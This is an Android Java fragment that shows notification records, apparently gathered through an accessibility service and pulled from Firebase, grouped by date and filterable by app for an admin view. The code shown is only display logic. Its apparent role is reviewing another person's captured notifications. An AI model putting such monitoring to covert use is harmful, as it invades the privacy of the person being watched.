package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.graphics.Typeface;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.GridLayout;
import android.widget.LinearLayout;
import android.widget.Spinner;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.SpinnerItem;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TreeMap;
import java.util.TreeSet;
import java.util.stream.Collectors;

public class AccessibilityNotificationFragment extends Fragment {

    private static final DateTimeFormatter DISPLAY_TIME_FORMATTER =
            DateTimeFormatter.ofPattern("HH:mm:ss");

    private static GridLayout fragmentLayout;
    private static Spinner dateSpinner, appSpinner;
    private static View appFilterLayout;
    private static TreeMap<String, NotificationData> lastNotificationDataMap;
    private static String selectedDate = null;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater,
                             @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_accessibility_notification, container, false);
        fragmentLayout = view.findViewById(R.id.accessibility_notification_fragment_layout);
        dateSpinner = view.findViewById(R.id.notification_date_spinner);
        appSpinner = view.findViewById(R.id.accessibility_notification_fragment_dropdown_spinner);
        appFilterLayout = view.findViewById(R.id.layout_app_filter);
        
        // Buttons are now in AdminNotificationContainerFragment
        view.findViewById(R.id.accessibility_notification_back_button).setVisibility(View.GONE);
        view.findViewById(R.id.accessibility_notification_refresh_button).setVisibility(View.GONE);

        fragmentLayout.setColumnCount(calculateNoOfColumns());
        
        if (lastNotificationDataMap != null) {
            updateUI(getActivity(), lastNotificationDataMap);
        }
        
        FirebaseUtils.getAndroidUserAccessibilityNotification();
        return view;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        fragmentLayout = null;
        dateSpinner = null;
        appSpinner = null;
        appFilterLayout = null;
    }

    private int calculateNoOfColumns() {
        DisplayMetrics dm = getResources().getDisplayMetrics();
        float dpWidth = dm.widthPixels / dm.density;
        return Math.max(1, Math.min((int) (dpWidth / 300), 3));
    }

    public static void displayNotifications(Activity activity,
                                             TreeMap<String, NotificationData> notificationDataTreeMap) {
        lastNotificationDataMap = notificationDataTreeMap;
        if (activity != null) {
            activity.runOnUiThread(() -> updateUI(activity, notificationDataTreeMap));
        }
    }

    private static void updateUI(Activity activity, TreeMap<String, NotificationData> notificationDataTreeMap) {
        if (fragmentLayout == null || dateSpinner == null || activity == null) return;

        Map<String, List<NotificationData>> dateGroups = groupByDateString(notificationDataTreeMap);
        List<String> sortedDates = new ArrayList<>(dateGroups.keySet());
        sortedDates.sort(Comparator.reverseOrder());

        initializeDateSpinner(activity, sortedDates, dateGroups);
    }

    private static void initializeDateSpinner(Activity activity, List<String> dates, Map<String, List<NotificationData>> dateGroups) {
        SpinnerItem[] items = new SpinnerItem[dates.size() + 1];
        items[0] = new SpinnerItem("Select a date", null);
        for (int i = 0; i < dates.size(); i++) {
            items[i + 1] = new SpinnerItem(dates.get(i), null);
        }

        ArrayAdapter<SpinnerItem> adapter = createSpinnerAdapter(activity, items);
        dateSpinner.setAdapter(adapter);

        // Default select today
        String today = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
        int defaultPos = -1;
        for (int i = 0; i < items.length; i++) {
            if (items[i].getLabel().equals(today)) {
                defaultPos = i;
                break;
            }
        }
        if (defaultPos != -1) dateSpinner.setSelection(defaultPos);

        dateSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                if (position == 0) {
                    selectedDate = null;
                    appFilterLayout.setVisibility(View.GONE);
                    fragmentLayout.removeAllViews();
                } else {
                    selectedDate = items[position].getLabel();
                    appFilterLayout.setVisibility(View.VISIBLE);
                    setupAppSpinner(activity, dateGroups.get(selectedDate));
                }
            }
            @Override public void onNothingSelected(AdapterView<?> parent) {}
        });
    }

    private static void setupAppSpinner(Activity activity, List<NotificationData> notificationsForDate) {
        if (appSpinner == null) return;

        TreeSet<String> uniquePackages = new TreeSet<>();
        for (NotificationData nd : notificationsForDate) {
            if (nd.getPackageName() != null) uniquePackages.add(nd.getPackageName());
        }

        SpinnerItem[] items = new SpinnerItem[uniquePackages.size() + 2];
        items[0] = new SpinnerItem("Filter by application", null);
        items[1] = new SpinnerItem("Show all for this date", null);
        int index = 2;
        for (String pkg : uniquePackages) items[index++] = new SpinnerItem(pkg, null);

        ArrayAdapter<SpinnerItem> adapter = createSpinnerAdapter(activity, items);
        appSpinner.setAdapter(adapter);
        appSpinner.setSelection(1); // Default show all for date

        appSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                fragmentLayout.removeAllViews();
                if (position == 0) return;
                if (position == 1) {
                    displayFilteredNotifications(activity, notificationsForDate, null);
                } else {
                    displayFilteredNotifications(activity, notificationsForDate, items[position].getLabel());
                }
            }
            @Override public void onNothingSelected(AdapterView<?> parent) {}
        });
    }

    private static void displayFilteredNotifications(Activity activity, List<NotificationData> list, @Nullable String pkg) {
        fragmentLayout.removeAllViews();
        List<NotificationData> filtered = list.stream()
                .filter(nd -> pkg == null || nd.getPackageName().equals(pkg))
                .sorted(Comparator.comparing(nd -> parseTimestamp(nd.getTimestamp()), Comparator.reverseOrder()))
                .collect(Collectors.toList());

        if (filtered.isEmpty()) {
            TextView empty = new TextView(activity);
            empty.setText("No records for this filter.");
            empty.setTextColor(activity.getColor(R.color.text_hint));
            empty.setPadding(32, 32, 32, 32);
            fragmentLayout.addView(empty);
            return;
        }

        LinearLayout group = createGroupLayout(activity, selectedDate != null ? selectedDate : "Selected Data");
        for (NotificationData nd : filtered) addNotificationRow(group, nd);
        fragmentLayout.addView(group);
    }

    private static ArrayAdapter<SpinnerItem> createSpinnerAdapter(Activity activity, SpinnerItem[] items) {
        ArrayAdapter<SpinnerItem> adapter = new ArrayAdapter<SpinnerItem>(activity, android.R.layout.simple_spinner_item, items) {
            @NonNull @Override public View getView(int pos, @Nullable View cv, @NonNull ViewGroup p) {
                TextView tv = (TextView) super.getView(pos, cv, p);
                tv.setTextColor(activity.getColor(R.color.text_primary));
                tv.setTextSize(14f);
                return tv;
            }
            @Override public View getDropDownView(int pos, @Nullable View cv, @NonNull ViewGroup p) {
                TextView tv = (TextView) super.getDropDownView(pos, cv, p);
                tv.setTextColor(activity.getColor(R.color.text_primary));
                tv.setBackgroundColor(activity.getColor(R.color.surface_variant));
                tv.setPadding(32, 24, 32, 24);
                return tv;
            }
        };
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        return adapter;
    }

    private static Map<String, List<NotificationData>> groupByDateString(TreeMap<String, NotificationData> map) {
        Map<String, List<NotificationData>> grouped = new HashMap<>();
        map.values().forEach(nd -> {
            LocalDateTime dt = parseTimestamp(nd.getTimestamp());
            String date = dt.toLocalDate().toString();
            grouped.computeIfAbsent(date, k -> new ArrayList<>()).add(nd);
        });
        return grouped;
    }

    private static LocalDateTime parseTimestamp(String ts) {
        if (ts == null) return LocalDateTime.now();
        try {
            return LocalDateTime.parse(ts);
        } catch (Exception e) {
            try {
                // Try old format
                return LocalDateTime.parse(ts, DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
            } catch (Exception e2) {
                LoggerUtils.e("NotificationFragment", "Failed to parse timestamp: " + ts);
                return LocalDateTime.now();
            }
        }
    }

    private static LinearLayout createGroupLayout(Activity activity, String dateText) {
        float density = activity.getResources().getDisplayMetrics().density;
        LinearLayout group = new LinearLayout(activity);
        group.setOrientation(LinearLayout.VERTICAL);
        group.setBackgroundResource(R.drawable.group_border);
        int pad = dp(16, density);
        group.setPadding(pad, pad, pad, pad);

        GridLayout.LayoutParams p = new GridLayout.LayoutParams();
        p.width = 0;
        p.height = GridLayout.LayoutParams.WRAP_CONTENT;
        p.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
        p.setMargins(dp(8, density), dp(8, density), dp(8, density), dp(8, density));
        group.setLayoutParams(p);

        TextView header = new TextView(activity);
        header.setText(dateText);
        header.setTextColor(activity.getColor(R.color.text_primary));
        header.setTextSize(14f);
        header.setTypeface(null, Typeface.BOLD);
        LinearLayout.LayoutParams hp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        hp.setMargins(0, 0, 0, dp(8, density));
        header.setLayoutParams(hp);
        group.addView(header);

        View divider = new View(activity);
        divider.setBackgroundColor(activity.getColor(R.color.divider));
        LinearLayout.LayoutParams dp2 = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1);
        dp2.setMargins(0, 0, 0, dp(8, density));
        divider.setLayoutParams(dp2);
        group.addView(divider);

        return group;
    }

    private static void addNotificationRow(LinearLayout group, NotificationData nd) {
        Activity activity = (Activity) group.getContext();
        float density = activity.getResources().getDisplayMetrics().density;

        LocalDateTime dt = parseTimestamp(nd.getTimestamp());
        String time = dt.format(DISPLAY_TIME_FORMATTER);
        
        StringBuilder sb = new StringBuilder();
        sb.append("[").append(time).append("] ");
        
        String pkg = nd.getPackageName();
        if (pkg != null) {
            String shortName = pkg.contains(".") ? pkg.substring(pkg.lastIndexOf(".") + 1) : pkg;
            sb.append(shortName).append("\n");
        }

        if (nd.getExtras() != null) {
            nd.getExtras().forEach((k, v) -> {
                if (v != null && !v.toString().isEmpty() && !k.startsWith("android_")) {
                    sb.append("• ").append(k.replace("_", " ")).append(": ").append(v).append("\n");
                }
            });
        }

        TextView tv = new TextView(activity);
        tv.setText(sb.toString().trim());
        tv.setTextColor(activity.getColor(R.color.text_secondary));
        tv.setTextSize(12f);
        tv.setLineSpacing(0, 1.3f);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, dp(6, density), 0, dp(2, density));
        tv.setLayoutParams(lp);
        group.addView(tv);

        View sep = new View(activity);
        sep.setBackgroundColor(activity.getColor(R.color.divider));
        LinearLayout.LayoutParams sepParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1);
        sepParams.setMargins(0, dp(4, density), 0, 0);
        sep.setLayoutParams(sepParams);
        group.addView(sep);
    }

    private static int dp(int v, float density) {
        return (int) (v * density);
    }
}
